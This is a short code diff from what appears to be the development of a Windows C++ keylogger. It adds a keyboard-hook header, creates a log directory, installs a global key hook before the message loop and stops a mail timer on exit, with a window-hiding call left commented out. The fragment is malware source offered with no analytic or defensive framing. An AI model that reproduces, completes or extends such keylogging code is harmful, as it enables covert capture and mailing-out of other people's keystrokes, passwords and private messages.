@@ -1,6 +1,5 @@
 #include <iostream>
-#include "Constants.h"
-#include "Mailer.h"
+#include "KeyBoardHook.h"
 #include <TlHelp32.h>
 using namespace std;
 
@@ -15,6 +14,10 @@ int main()
         KeyLogger::InfoLogger("Closing the new instance.");
         return 0;
     }
+    Input_Output::MakeDirectoryNeeded(Input_Output::GetPath(true));
+
+    InstallKeyHook();
+
     //HideWindow();
     MSG msg;
     while (GetMessage(&msg, NULL, 0, 0))
@@ -22,6 +25,7 @@ int main()
         TranslateMessage(&msg);
         DispatchMessage(&msg);
     }
+    SetMailTimer.Timer_Stop();
     return 0;
 }
 
